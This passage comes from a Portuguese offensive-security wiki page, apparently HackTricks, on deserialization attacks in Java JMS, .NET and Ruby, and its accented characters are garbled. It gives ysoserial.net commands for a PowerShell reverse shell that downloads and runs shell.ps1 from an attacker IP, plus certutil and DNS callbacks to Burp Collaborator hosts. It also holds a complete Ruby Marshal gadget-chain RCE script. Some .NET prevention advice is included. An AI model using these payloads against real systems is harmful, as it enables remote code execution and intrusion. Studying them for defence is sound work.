            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```
**Fortalecer todo o uso de java.io.ObjectInputStream com um Agente**

Se voc√™ n√£o possui o c√≥digo ou n√£o pode esperar por uma corre√ß√£o, usar um agente para tecer fortalecimento em `java.io.ObjectInputStream` √© a melhor solu√ß√£o.\
Usando essa abordagem, voc√™ s√≥ pode colocar em uma lista negra tipos maliciosos conhecidos e n√£o coloc√°-los em uma lista branca, j√° que voc√™ n√£o sabe quais objetos est√£o sendo serializados.

Para habilitar esses agentes, basta adicionar um novo par√¢metro JVM:
```
-javaagent:name-of-agent.jar
```
Exemplo: [rO0 pela Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

### Refer√™ncias

* Palestra sobre deserializa√ß√£o e ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Palestra sobre gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) e slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Artigo sobre Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Artigo sobre deserializa√ß√µes CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Inje√ß√£o JNDI e log4Shell

Descubra o que √© **Inje√ß√£o JNDI, como abus√°-la via RMI, CORBA e LDAP e como explorar o log4shell** (e exemplo dessa vulnerabilidade) na seguinte p√°gina:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> A API **Java Message Service** (**JMS**) √© uma API de middleware orientada a mensagens Java para enviar mensagens entre dois ou mais clientes. √â uma implementa√ß√£o para lidar com o problema produtor-consumidor. O JMS √© uma parte da Plataforma Java, Enterprise Edition (Java EE), e foi definido por uma especifica√ß√£o desenvolvida na Sun Microsystems, mas que desde ent√£o tem sido guiada pelo Java Community Process. √â um padr√£o de mensagens que permite que componentes de aplicativos baseados em Java EE criem, enviem, recebam e leiam mensagens. Ele permite que a comunica√ß√£o entre diferentes componentes de um aplicativo distribu√≠do seja fracamente acoplada, confi√°vel e ass√≠ncrona. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produtos

Existem v√°rios produtos que usam esse middleware para enviar mensagens:

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### Explora√ß√£o

Basicamente, h√° **um monte de servi√ßos usando JMS de maneira perigosa**. Portanto, se voc√™ tiver **privil√©gios suficientes** para enviar mensagens para esses servi√ßos (geralmente precisar√° de credenciais v√°lidas), poder√° enviar **objetos maliciosos serializados que ser√£o desserializados pelo consumidor/assinante**.\
Isso significa que, nessa explora√ß√£o, todos os **clientes que v√£o usar essa mensagem ser√£o infectados**.

Voc√™ deve lembrar que, mesmo que um servi√ßo seja vulner√°vel (porque est√° desserializando de forma insegura a entrada do usu√°rio), voc√™ ainda precisa encontrar gadgets v√°lidos para explorar a vulnerabilidade.

A ferramenta [JMET](https://github.com/matthiaskaiser/jmet) foi criada para **conectar e atacar esses servi√ßos enviando v√°rios objetos maliciosos serializados usando gadgets conhecidos**. Esses exploits funcionar√£o se o servi√ßo ainda estiver vulner√°vel e se algum dos gadgets usados estiver dentro do aplicativo vulner√°vel.

### Refer√™ncias

* Palestra sobre JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

O .Net √© semelhante ao Java em rela√ß√£o a como os exploits de desserializa√ß√£o funcionam: o **exploit** ir√° **abusar de gadgets** que **executam** algum **c√≥digo interessante quando** um objeto √© **desserializado**.

### Identifica√ß√£o

#### WhiteBox

Procure no c√≥digo-fonte pelos seguintes termos:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Procure por qualquer serializador em que o tipo seja definido por uma vari√°vel controlada pelo usu√°rio.

#### BlackBox

Voc√™ pode procurar pela string codificada em Base64 **AAEAAAD/////** ou qualquer outra coisa que **possa ser desserializada** no back-end e que permita controlar o tipo desserializado. Por exemplo, um **JSON** ou **XML** contendo `TypeObject` ou `$type`.

### ysoserial.net

Nesse caso, voc√™ pode usar a ferramenta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **criar os exploits de desserializa√ß√£o**. Depois de baixar o reposit√≥rio git, voc√™ deve **compilar a ferramenta** usando o Visual Studio, por exemplo.

Se voc√™ quiser aprender sobre **como o ysoserial.net cria seus exploits**, voc√™ pode [**verificar esta p√°gina onde √© explicado o gadget ObjectDataProvider + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

As principais op√ß√µes do **ysoserial.net** s√£o: **`--gadget`**, **`--formatter`**, \*\*`--output` \*\* e **`--plugin`.**

* **`--gadget`** usado para indicar o gadget a ser abusado (indique a classe/fun√ß√£o que ser√° abusada durante a desserializa√ß√£o para executar comandos).
* **`--formatter`**, usado para indicar o m√©todo para serializar o exploit (voc√™ precisa saber qual biblioteca o back-end est√° usando para desserializar a carga √∫til e usar a mesma para serializ√°-la)
* \*\*`--output` \*\* usado para indicar se voc√™ deseja o exploit em **raw** ou codificado em **base64**. _Observe que o **ysoserial.net** ir√° **codificar** a carga √∫til usando **UTF-16LE** (codifica√ß√£o usada por padr√£o no Windows), portanto, se voc√™ obter o raw e apenas codific√°-lo a partir de um console linux, poder√° ter alguns problemas de **compatibilidade de codifica√ß√£o** que impedir√£o o exploit de funcionar corretamente (na caixa JSON do HTB, a carga √∫til funcionou em UTF-16LE e ASCII, mas isso n√£o significa que sempre funcionar√°)._
* \*\*`--plugin` \*\* o ysoserial
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
O **ysoserial.net** tamb√©m tem um **par√¢metro muito interessante** que ajuda a entender melhor como cada exploit funciona: `--test`. Se voc√™ indicar esse par√¢metro, o **ysoserial.net** tentar√° o **exploit localmente**, para que voc√™ possa testar se sua carga √∫til funcionar√° corretamente. Esse par√¢metro √© √∫til porque, se voc√™ revisar o c√≥digo, encontrar√° trechos de c√≥digo como o seguinte (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
            if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
```
Isso significa que, para testar a explora√ß√£o, o c√≥digo chamar√° [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539).
```java
public static object JsonNet_deserialize(string str)
    {
        Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.Auto
        });
        return obj;
    }
```
No c√≥digo anterior √© vulner√°vel ao exploit criado. Portanto, se voc√™ encontrar algo semelhante em um aplicativo .Net, isso significa que provavelmente esse aplicativo tamb√©m √© vulner√°vel.\
Portanto, o par√¢metro **`--test`** nos permite entender **quais trechos de c√≥digo s√£o vulner√°veis** ao exploit de deserializa√ß√£o que **ysoserial.net** pode criar.

### ViewState

D√™ uma olhada neste POST sobre **como tentar explorar o par√¢metro \_\_ViewState do .Net** para **executar c√≥digo arbitr√°rio**. Se voc√™ **j√° conhece os segredos** usados pela m√°quina v√≠tima, [**leia este post para saber como executar c√≥digo**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### **Preven√ß√£o**

N√£o permita que o fluxo de dados defina o tipo de objeto para o qual o fluxo ser√° desserializado. Voc√™ pode evitar isso, por exemplo, usando o `DataContractSerializer` ou `XmlSerializer`, se poss√≠vel.

Onde o `JSON.Net` est√° sendo usado, certifique-se de que o `TypeNameHandling` esteja definido apenas como `None`.
```
TypeNameHandling = TypeNameHandling.None
```
Se for usar o `JavaScriptSerializer`, n√£o use-o com um `JavaScriptTypeResolver`.

Se voc√™ precisar desserializar fluxos de dados que definem seu pr√≥prio tipo, restrinja os tipos que s√£o permitidos ser desserializados. Deve-se estar ciente de que isso ainda √© arriscado, pois muitos tipos nativos do .Net s√£o potencialmente perigosos em si mesmos. Por exemplo:
```
System.IO.FileInfo
```
Objetos `FileInfo` que referenciam arquivos que est√£o realmente no servidor podem, quando desserializados, alterar as propriedades desses arquivos, como torn√°-los somente leitura, criando um potencial ataque de nega√ß√£o de servi√ßo.

Mesmo que voc√™ tenha limitado os tipos que podem ser desserializados, lembre-se de que alguns tipos t√™m propriedades arriscadas. `System.ComponentModel.DataAnnotations.ValidationException`, por exemplo, tem uma propriedade `Value` do tipo `Object`. Se este tipo for permitido para desserializa√ß√£o, um invasor pode definir a propriedade `Value` para qualquer tipo de objeto que escolher.

Os invasores devem ser impedidos de direcionar o tipo que ser√° instanciado. Se isso for poss√≠vel, at√© mesmo `DataContractSerializer` ou `XmlSerializer` podem ser subvertidos, por exemplo.
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();  

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
A execu√ß√£o pode ocorrer dentro de certos tipos .Net durante a desserializa√ß√£o. Criar um controle como o mostrado abaixo √© ineficaz.
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
    //generate warnings and dispose of suspectObject
}
```
Para `BinaryFormatter` e `JSON.Net`, √© poss√≠vel criar uma forma mais segura de controle de lista branca usando um `SerializationBinder` personalizado.

Tente se manter atualizado sobre os gadgets de deserializa√ß√£o inseguros conhecidos do .Net e preste aten√ß√£o especial onde tais tipos podem ser criados pelos seus processos de deserializa√ß√£o. **Um desserializador s√≥ pode instanciar tipos que ele conhece**.

Tente manter qualquer c√≥digo que possa criar gadgets potenciais separado de qualquer c√≥digo que tenha conectividade com a internet. Como exemplo, `System.Windows.Data.ObjectDataProvider` usado em aplicativos WPF √© um gadget conhecido que permite a invoca√ß√£o arbitr√°ria de m√©todos. Seria arriscado ter uma refer√™ncia a este assembly em um projeto de servi√ßo REST que desserializa dados n√£o confi√°veis.

### **Refer√™ncias**

* Java e .Net JSON deserializa√ß√£o **artigo:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** palestra: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) e slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby tem dois m√©todos para implementar serializa√ß√£o dentro da biblioteca **marshal**: o primeiro m√©todo √© **dump** que converte o objeto em fluxos de bytes **(serializar)**. E o segundo m√©todo √© **load** para converter o fluxo de bytes em objeto novamente (**desserializar**).\
Ruby usa HMAC para assinar o objeto serializado e salva a chave em um dos seguintes arquivos:

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Cadeia de gadgets de deserializa√ß√£o gen√©rica do Ruby 2.X para RCE (mais informa√ß√µes em [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)):
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Outra cadeia de RCE para explorar o Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
